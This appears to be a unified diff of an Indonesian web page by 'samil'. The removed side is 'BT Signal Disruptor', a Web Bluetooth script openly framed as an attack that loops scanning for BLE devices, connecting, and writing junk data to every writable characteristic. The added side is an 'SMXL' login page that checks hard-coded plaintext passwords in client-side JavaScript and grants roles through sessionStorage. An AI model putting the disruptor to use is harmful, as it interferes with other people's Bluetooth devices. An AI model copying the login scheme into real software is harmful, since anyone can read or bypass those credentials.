@@ -1,473 +1,332 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>BT Signal Disruptor</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>SMXL - Login</title>
+    <!-- Font Awesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
-        body {
-            background: #0a0a0f;
-            font-family: 'Inter', -apple-system, 'Segoe UI', sans-serif;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-            color: #e0e0e0;
-        }
-        .card-disrupt {
-            background: #1a1a2e;
-            border: 1px solid #2a2a4e;
-            border-radius: 28px;
-            padding: 32px 24px;
-            max-width: 480px;
-            width: 100%;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
-            animation: fadeUp 0.5s ease;
-        }
-        @keyframes fadeUp {
-            from { opacity: 0; transform: translateY(30px); }
-            to { opacity: 1; transform: translateY(0); }
+        /* ========== RESET & GLOBAL ========== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
 
-        .logo {
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: #0a0a0a;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* Animated background glow */
+        body::before {
+            content: '';
+            position: fixed;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(ellipse at 30% 50%, rgba(255, 107, 0, 0.08) 0%, transparent 60%),
+                radial-gradient(ellipse at 70% 50%, rgba(255, 107, 0, 0.05) 0%, transparent 60%);
+            animation: rotateGlow 20s linear infinite;
+            z-index: 0;
+        }
+
+        @keyframes rotateGlow {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* ========== LOGIN CONTAINER ========== */
+        .login-wrapper {
+            position: relative;
+            z-index: 1;
+            width: 100%;
+            max-width: 420px;
+            padding: 20px;
+        }
+
+        .login-card {
+            background: rgba(16, 16, 16, 0.85);
+            backdrop-filter: blur(24px);
+            -webkit-backdrop-filter: blur(24px);
+            border: 1px solid rgba(255, 107, 0, 0.25);
+            border-radius: 32px;
+            padding: 48px 40px 40px;
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.8), 0 0 60px rgba(255, 107, 0, 0.05);
+            transition: transform 0.4s cubic-bezier(0.34, 1.56, 0.64, 1), box-shadow 0.4s ease;
+        }
+
+        .login-card:hover {
+            transform: translateY(-4px) scale(1.01);
+            box-shadow: 0 40px 100px rgba(0, 0, 0, 0.9), 0 0 80px rgba(255, 107, 0, 0.08);
+        }
+
+        /* ========== LOGO ========== */
+        .logo-area {
             text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .logo-icon {
+            font-size: 48px;
+            color: #ff6b00;
+            display: inline-block;
+            background: rgba(255, 107, 0, 0.12);
+            padding: 18px;
+            border-radius: 24px;
+            margin-bottom: 12px;
+            box-shadow: 0 0 40px rgba(255, 107, 0, 0.1);
+        }
+
+        .logo-area h1 {
+            font-size: 32px;
+            font-weight: 900;
+            background: linear-gradient(135deg, #ff6b00, #ff8c38);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: 2px;
+        }
+
+        .logo-area .subtitle {
+            color: rgba(255, 255, 255, 0.35);
+            font-size: 12px;
+            letter-spacing: 4px;
+            text-transform: uppercase;
+            margin-top: 4px;
+        }
+
+        /* ========== INPUT ========== */
+        .input-group {
+            position: relative;
             margin-bottom: 20px;
         }
-        .logo .icon-wrapper {
-            display: inline-block;
-            background: linear-gradient(135deg, #ff1a1a, #cc0000);
-            width: 64px;
-            height: 64px;
-            border-radius: 20px;
-            line-height: 64px;
-            text-align: center;
-            box-shadow: 0 8px 24px rgba(255, 0, 0, 0.25);
-            margin-bottom: 10px;
+
+        .input-group .input-icon {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: rgba(255, 255, 255, 0.25);
+            font-size: 16px;
+            transition: color 0.3s ease;
         }
-        .logo .icon-wrapper i { font-size: 32px; color: #fff; }
-        .logo .brand {
-            font-size: 24px;
-            font-weight: 800;
-            letter-spacing: -0.5px;
+
+        .input-group input {
+            width: 100%;
+            padding: 16px 20px 16px 48px;
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 16px;
             color: #fff;
+            font-size: 15px;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            outline: none;
         }
-        .logo .brand span { color: #ff1a1a; }
-        .logo .sub {
-            color: #6a6a8a;
-            font-size: 13px;
+
+        .input-group input::placeholder {
+            color: rgba(255, 255, 255, 0.2);
+            font-weight: 400;
+        }
+
+        .input-group input:focus {
+            border-color: #ff6b00;
+            background: rgba(255, 107, 0, 0.06);
+            box-shadow: 0 0 30px rgba(255, 107, 0, 0.06);
+        }
+
+        .input-group input:focus+.input-icon,
+        .input-group input:focus~.input-icon {
+            color: #ff6b00;
+        }
+
+        .input-group input:focus~.input-icon {
+            color: #ff6b00;
+        }
+
+        /* Fix icon position */
+        .input-group .input-icon {
+            pointer-events: none;
+        }
+
+        /* ========== BUTTON ========== */
+        .btn-login {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #ff6b00, #e65c00);
+            border: none;
+            border-radius: 16px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            letter-spacing: 1px;
+            margin-top: 8px;
+        }
+
+        .btn-login:hover {
+            transform: scale(1.02);
+            box-shadow: 0 8px 40px rgba(255, 107, 0, 0.35);
+        }
+
+        .btn-login:active {
+            transform: scale(0.97);
+        }
+
+        .btn-login .btn-icon {
+            margin-right: 10px;
+        }
+
+        /* ========== FOOTER ========== */
+        .login-footer {
+            text-align: center;
+            margin-top: 24px;
+            color: rgba(255, 255, 255, 0.15);
+            font-size: 12px;
             letter-spacing: 1px;
         }
 
-        .badge-status {
-            display: inline-block;
-            padding: 4px 16px;
-            border-radius: 60px;
-            font-size: 12px;
+        .login-footer span {
+            color: #ff6b00;
             font-weight: 600;
-            margin-top: 4px;
-        }
-        .badge-status.attacking {
-            background: #ff1a1a;
-            color: #fff;
-            animation: blink 0.5s infinite;
-        }
-        .badge-status.idle {
-            background: #2a2a4e;
-            color: #6a6a8a;
-        }
-        .badge-status.scanning {
-            background: #ff8800;
-            color: #000;
-            animation: blink 0.8s infinite;
-        }
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.3; }
         }
 
-        .stats {
-            display: flex;
-            justify-content: space-around;
-            padding: 12px 0;
-            border-top: 1px solid #1a1a2e;
-            border-bottom: 1px solid #1a1a2e;
-            margin: 12px 0;
-        }
-        .stats .stat {
+        /* ========== ERROR ========== */
+        .error-msg {
+            color: #ff4444;
+            font-size: 13px;
             text-align: center;
-        }
-        .stats .stat .number {
-            font-size: 24px;
-            font-weight: 700;
-            color: #ff1a1a;
-        }
-        .stats .stat .label {
-            font-size: 11px;
-            color: #4a4a6a;
-        }
-
-        .btn-attack {
-            background: linear-gradient(135deg, #ff1a1a, #cc0000);
-            border: none;
-            border-radius: 60px;
-            padding: 16px;
-            font-weight: 700;
-            font-size: 18px;
-            color: #fff;
-            width: 100%;
-            transition: 0.3s;
-            box-shadow: 0 4px 24px rgba(255, 0, 0, 0.3);
-            font-family: 'Inter', sans-serif;
-            margin-top: 8px;
-        }
-        .btn-attack:hover {
-            transform: scale(1.02);
-            box-shadow: 0 8px 40px rgba(255, 0, 0, 0.5);
-        }
-        .btn-attack:active { transform: scale(0.96); }
-        .btn-attack:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            transform: none;
-        }
-        .btn-attack i { margin-right: 10px; }
-
-        .btn-attack.stop {
-            background: linear-gradient(135deg, #333, #1a1a1a);
-            box-shadow: 0 4px 24px rgba(0,0,0,0.3);
-        }
-        .btn-attack.stop:hover {
-            box-shadow: 0 8px 40px rgba(0,0,0,0.5);
-        }
-
-        .log-container {
-            background: #0a0a1a;
-            border-radius: 14px;
-            padding: 12px 16px;
-            max-height: 120px;
-            overflow-y: auto;
             margin-top: 12px;
-            border: 1px solid #1a1a2e;
-            font-family: monospace;
-            font-size: 12px;
-            color: #6a6a8a;
-        }
-        .log-container::-webkit-scrollbar { width: 4px; }
-        .log-container::-webkit-scrollbar-track { background: #0a0a1a; }
-        .log-container::-webkit-scrollbar-thumb { background: #2a2a4e; border-radius: 10px; }
-        .log-container .log-entry {
-            padding: 2px 0;
-            border-bottom: 1px solid #0a0a1a;
-        }
-        .log-container .log-entry .time {
-            color: #4a4a6a;
-            margin-right: 8px;
-        }
-        .log-container .log-entry .found {
-            color: #00ff44;
-        }
-        .log-container .log-entry .attempt {
-            color: #ff8800;
-        }
-        .log-container .log-entry .failed {
-            color: #ff1a1a;
-        }
-        .log-container .log-entry .success {
-            color: #00ff44;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+            background: rgba(255, 68, 68, 0.08);
+            padding: 10px;
+            border-radius: 12px;
+            border: 1px solid rgba(255, 68, 68, 0.15);
         }
 
-        .footer-text {
-            text-align: center;
-            color: #4a4a6a;
-            font-size: 12px;
-            margin-top: 20px;
-            border-top: 1px solid #1a1a2e;
-            padding-top: 16px;
-        }
-        .footer-text strong { color: #ff1a1a; }
-
-        .toast-container {
-            position: fixed;
-            bottom: 24px;
-            left: 50%;
-            transform: translateX(-50%);
-            z-index: 9999;
-            background: #1a1a2e;
-            color: #fff;
-            padding: 12px 24px;
-            border-radius: 60px;
-            font-size: 14px;
-            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
-            display: none;
-            font-family: 'Inter', sans-serif;
-            max-width: 90%;
-            text-align: center;
+        .error-msg.show {
+            opacity: 1;
         }
 
-        @media (max-width: 400px) {
-            .stats .stat .number { font-size: 20px; }
-            .btn-attack { font-size: 16px; padding: 14px; }
+        /* ========== RESPONSIVE ========== */
+        @media (max-width: 480px) {
+            .login-card {
+                padding: 32px 24px 28px;
+                border-radius: 24px;
+            }
+            .logo-area h1 {
+                font-size: 26px;
+            }
         }
     </style>
 </head>
 <body>
 
-<div class="card-disrupt">
+    <div class="login-wrapper">
+        <div class="login-card">
 
-    <!-- LOGO -->
-    <div class="logo">
-        <div class="icon-wrapper"><i class="bi bi-bluetooth-off"></i></div>
-        <div class="brand">BT <span>Disruptor</span></div>
-        <div class="sub">Bluetooth Signal Disruptor</div>
-        <span class="badge-status idle" id="statusBadge"><i class="bi bi-dot"></i> Idle</span>
-    </div>
+            <!-- LOGO -->
+            <div class="logo-area">
+                <div class="logo-icon">
+                    <i class="fas fa-bolt"></i>
+                </div>
+                <h1>SMXL</h1>
+                <div class="subtitle">Super Max Level</div>
+            </div>
 
-    <!-- ===== STATS ===== -->
-    <div class="stats">
-        <div class="stat">
-            <div class="number" id="deviceFound">0</div>
-            <div class="label">Device Ditemukan</div>
+            <!-- FORM -->
+            <form id="loginForm" autocomplete="off">
+                <div class="input-group">
+                    <i class="fas fa-user input-icon"></i>
+                    <input type="text" id="username" placeholder="Masukan Username" required />
+                </div>
+
+                <div class="input-group">
+                    <i class="fas fa-lock input-icon"></i>
+                    <input type="password" id="password" placeholder="Masukan Password" required />
+                </div>
+
+                <button type="submit" class="btn-login">
+                    <i class="fas fa-sign-in-alt btn-icon"></i> LOGIN
+                </button>
+
+                <div id="errorMsg" class="error-msg">
+                    <i class="fas fa-exclamation-circle"></i> Username atau Password salah!
+                </div>
+            </form>
+
+            <!-- FOOTER -->
+            <div class="login-footer">
+                <i class="fas fa-code"></i> created by <span>SAMIL</span>
+            </div>
+
         </div>
-        <div class="stat">
-            <div class="number" id="attackAttempts">0</div>
-            <div class="label">Percobaan</div>
-        </div>
-        <div class="stat">
-            <div class="number" id="attackSuccess">0</div>
-            <div class="label">Berhasil</div>
-        </div>
     </div>
 
-    <!-- ===== LOG ===== -->
-    <div class="log-container" id="logContainer">
-        <div class="log-entry" style="color: #4a4a6a;">[System] Siap menyerang...</div>
-    </div>
+    <script>
+        // ============================================================
+        // LOGIN HANDLER
+        // ============================================================
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
 
-    <!-- ===== BUTTONS ===== -->
-    <button class="btn-attack" id="btnAttack"><i class="bi bi-lightning-fill"></i> MULAI SERANGAN</button>
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const errorEl = document.getElementById('errorMsg');
 
-    <div class="footer-text">
-        &copy; 2026 <strong>BT Disruptor</strong> — by samil
-    </div>
-</div>
-
-<!-- ===== TOAST ===== -->
-<div class="toast-container" id="toast">Pesan</div>
-
-<script>
-    // ============================================================
-    // BLUETOOTH SIGNAL DISRUPTOR — SPAM SCAN + FLOOD CONNECT
-    // ============================================================
-
-    // ===== STATE =====
-    let isAttacking = false;
-    let attackInterval = null;
-    let deviceFound = 0;
-    let attackAttempts = 0;
-    let attackSuccess = 0;
-    let discoveredDevices = [];
-
-    // ===== DOM =====
-    const btnAttack = document.getElementById('btnAttack');
-    const statusBadge = document.getElementById('statusBadge');
-    const logContainer = document.getElementById('logContainer');
-    const deviceFoundEl = document.getElementById('deviceFound');
-    const attackAttemptsEl = document.getElementById('attackAttempts');
-    const attackSuccessEl = document.getElementById('attackSuccess');
-    const toast = document.getElementById('toast');
-
-    // ============================================================
-    // TOAST
-    // ============================================================
-    function showToast(message, duration = 3000) {
-        toast.textContent = message;
-        toast.style.display = 'block';
-        clearTimeout(toast._timer);
-        toast._timer = setTimeout(() => {
-            toast.style.display = 'none';
-        }, duration);
-    }
-
-    // ============================================================
-    // LOG
-    // ============================================================
-    function addLog(message, type = 'info') {
-        const entry = document.createElement('div');
-        entry.className = 'log-entry';
-        const time = new Date().toLocaleTimeString('id-ID');
-        let color = '';
-        if (type === 'found') color = 'found';
-        else if (type === 'attempt') color = 'attempt';
-        else if (type === 'failed') color = 'failed';
-        else if (type === 'success') color = 'success';
-
-        entry.innerHTML = `<span class="time">[${time}]</span><span class="${color}">${message}</span>`;
-        logContainer.appendChild(entry);
-        logContainer.scrollTop = logContainer.scrollHeight;
-
-        // Batasi log
-        while (logContainer.children.length > 50) {
-            logContainer.removeChild(logContainer.firstChild);
-        }
-    }
-
-    // ============================================================
-    // UPDATE STATS
-    // ============================================================
-    function updateStats() {
-        deviceFoundEl.textContent = deviceFound;
-        attackAttemptsEl.textContent = attackAttempts;
-        attackSuccessEl.textContent = attackSuccess;
-    }
-
-    // ============================================================
-    // SET STATUS
-    // ============================================================
-    function setStatus(text, type = 'idle') {
-        statusBadge.textContent = text;
-        statusBadge.className = 'badge-status ' + type;
-        if (type === 'attacking') {
-            statusBadge.innerHTML = '<i class="bi bi-lightning-fill"></i> ' + text;
-        } else if (type === 'scanning') {
-            statusBadge.innerHTML = '<i class="bi bi-arrow-repeat"></i> ' + text;
-        } else {
-            statusBadge.innerHTML = '<i class="bi bi-dot"></i> ' + text;
-        }
-    }
-
-    // ============================================================
-    // CEK SUPPORT BLUETOOTH
-    // ============================================================
-    if (!navigator.bluetooth) {
-        showToast('❌ Web Bluetooth tidak support. Gunakan Chrome/Edge.', 5000);
-        btnAttack.disabled = true;
-        addLog('❌ Browser tidak support Web Bluetooth', 'failed');
-    }
-
-    // ============================================================
-    // SCAN & FLOOD CONNECT (DISRUPTOR CORE)
-    // ============================================================
-    async function disrupt() {
-        if (!isAttacking) return;
-
-        try {
-            addLog('🔍 Scan perangkat BLE...', 'attempt');
-
-            // === SCAN ===
-            const device = await navigator.bluetooth.requestDevice({
-                acceptAllDevices: true,
-                optionalServices: []
-            });
-
-            deviceFound++;
-            const deviceName = device.name || 'Unnamed Device';
-            addLog(`📡 Ditemukan: ${deviceName} (${device.id})`, 'found');
-
-            // === FLOOD CONNECT ATTEMPT ===
-            attackAttempts++;
-            addLog(`🔌 Mencoba konek ke ${deviceName}...`, 'attempt');
-
-            try {
-                const server = await device.gatt.connect();
-                // Kirim garbage data (jika ada karakteristik)
-                try {
-                    const services = await server.getPrimaryServices();
-                    for (let svc of services) {
-                        try {
-                            const chars = await svc.getCharacteristics();
-                            for (let c of chars) {
-                                if (c.properties.write || c.properties.writeWithoutResponse) {
-                                    try {
-                                        // Kirim garbage data
-                                        const encoder = new TextEncoder();
-                                        const garbage = encoder.encode('DISRUPT');
-                                        await c.writeValue(garbage);
-                                        addLog(`💥 Spam data ke ${deviceName}`, 'success');
-                                    } catch(e) {}
-                                }
-                            }
-                        } catch(e) {}
-                    }
-                } catch(e) {}
-
-                // Disconnect langsung
-                await server.disconnect();
-                attackSuccess++;
-                addLog(`✅ Berhasil ganggu ${deviceName}`, 'success');
-
-            } catch(e) {
-                addLog(`❌ Gagal konek: ${e.message}`, 'failed');
-            }
-
-            updateStats();
-
-        } catch (error) {
-            if (error.message.includes('cancelled')) {
-                addLog('⏹️ Scan dibatalkan user', 'failed');
-            } else {
-                addLog(`❌ Error: ${error.message}`, 'failed');
-            }
-        }
-
-        // Lanjut attack
-        if (isAttacking) {
-            setTimeout(disrupt, 500);
-        }
-    }
-
-    // ============================================================
-    // MULAI / HENTIKAN SERANGAN
-    // ============================================================
-    function toggleAttack() {
-        if (isAttacking) {
-            // STOP
-            isAttacking = false;
-            btnAttack.innerHTML = '<i class="bi bi-lightning-fill"></i> MULAI SERANGAN';
-            btnAttack.className = 'btn-attack';
-            setStatus('Idle', 'idle');
-            addLog('⏹️ Serangan dihentikan', 'failed');
-            showToast('⏹️ Serangan dihentikan', 2000);
-        } else {
-            // START
-            if (!navigator.bluetooth) {
-                showToast('❌ Web Bluetooth tidak support', 4000);
+            // Validasi sederhana
+            if (username === '' || password === '') {
+                errorEl.textContent = '⚠️ Username dan Password harus diisi!';
+                errorEl.classList.add('show');
                 return;
             }
-            isAttacking = true;
-            btnAttack.innerHTML = '<i class="bi bi-stop-fill"></i> HENTIKAN SERANGAN';
-            btnAttack.className = 'btn-attack stop';
-            setStatus('Menyerang...', 'attacking');
-            addLog('⚡ SERANGAN DIMULAI!', 'success');
-            showToast('⚡ Serangan dimulai!', 2000);
-            // Reset stats
-            deviceFound = 0;
-            attackAttempts = 0;
-            attackSuccess = 0;
-            updateStats();
-            // Mulai disrupt
-            setTimeout(disrupt, 500);
-        }
-    }
 
-    // ============================================================
-    // EVENT LISTENERS
-    // ============================================================
-    btnAttack.addEventListener('click', toggleAttack);
+            // Cek kredensial
+            if (username === 'admin' && password === 'admin123') {
+                // Simpan ke session storage
+                sessionStorage.setItem('smxl_user', username);
+                sessionStorage.setItem('smxl_role', 'Administrator');
+                sessionStorage.setItem('smxl_exp', '12,847');
 
-    // ============================================================
-    // INIT
-    // ============================================================
-    setStatus('Idle', 'idle');
-    updateStats();
-    addLog('[System] Siap mengganggu sinyal Bluetooth', 'info');
+                // Redirect ke dashboard
+                window.location.href = 'dashboard.html';
+            } else if (username === 'user' && password === 'user123') {
+                sessionStorage.setItem('smxl_user', username);
+                sessionStorage.setItem('smxl_role', 'Member');
+                sessionStorage.setItem('smxl_exp', '3,421');
 
-    console.log('🔍 BT Disruptor siap');
-</script>
+                window.location.href = 'dashboard.html';
+            } else if (username === 'samil' && password === 'samil123') {
+                sessionStorage.setItem('smxl_user', username);
+                sessionStorage.setItem('smxl_role', 'Developer');
+                sessionStorage.setItem('smxl_exp', '99,999');
+
+                window.location.href = 'dashboard.html';
+            } else {
+                errorEl.textContent = '❌ Username atau Password salah!';
+                errorEl.classList.add('show');
+
+                // Sembunyikan error setelah 3 detik
+                setTimeout(() => {
+                    errorEl.classList.remove('show');
+                }, 3000);
+            }
+        });
+    </script>
 
 </body>
-                </html>
+</html>
